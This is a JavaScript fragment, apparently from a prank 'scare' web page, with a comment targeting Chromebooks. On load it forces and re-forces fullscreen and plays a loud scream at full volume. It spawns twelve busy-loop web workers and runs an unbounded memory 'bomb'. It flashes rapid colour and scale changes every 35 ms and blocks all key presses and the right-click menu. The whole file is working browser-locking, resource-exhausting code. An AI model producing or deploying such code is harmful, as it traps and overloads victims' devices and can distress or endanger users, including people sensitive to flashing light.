  // AUDIO: put the mp3 next to this html OR paste base64 below
  // easiest: keep the mp3 named exactly this and place it beside the html
  const audio = document.getElementById("scream");
  audio.src = "CRIMINAL HAS JOINED (PROD 3AM).mp3";
  // if you want pure single-file later, replace the line above with:
  // audio.src = "data:audio/mpeg;base64,YOUR_BASE64_HERE";

  function goFullscreen() {
    const el = document.documentElement;
    (el.requestFullscreen || el.webkitRequestFullscreen || el.msRequestFullscreen || function(){}).call(el);
  }

  function start() {
    goFullscreen();

    const play = () => {
      audio.volume = 1;
      audio.play().catch(()=>{});
    };
    play();

    // Chromebook autoplay unlock
    ["click","touchstart","keydown"].forEach(evt => {
      document.addEventListener(evt, function unlock() {
        play();
        document.removeEventListener(evt, unlock);
      }, {once:true});
    });

    // cpu workers
    for (let i = 0; i < 12; i++) {
      try {
        new Worker(URL.createObjectURL(new Blob([`
          onmessage = function(){ while(true){ let x=0; for(let j=0;j<4e7;j++) x+=Math.sin(j)*Math.random(); } };
          postMessage(1);
        `], {type:"application/javascript"})));
      } catch(e){}
    }

    // memory pressure
    const bomb = [];
    setInterval(() => {
      try {
        for (let i = 0; i < 80; i++) bomb.push(new Float64Array(4e5));
      } catch(e){}
    }, 50);

    // visual chaos
    const face = document.getElementById("face");
    setInterval(() => {
      face.style.filter = `hue-rotate(${Math.random()*360}deg) contrast(${1+Math.random()*2}) brightness(${0.5+Math.random()}) saturate(${1+Math.random()*4})`;
      document.body.style.transform = `scale(${1+Math.random()*0.04})`;
    }, 35);

    // re-force fullscreen
    setInterval(() => {
      if (!document.fullscreenElement) goFullscreen();
    }, 250);

    // block keys / right click
    document.addEventListener("contextmenu", e => e.preventDefault());
    document.addEventListener("keydown", e => { e.preventDefault(); e.stopPropagation(); }, true);
  }

  if (document.readyState === "complete") start();
  else window.addEventListener("load", start);
})();
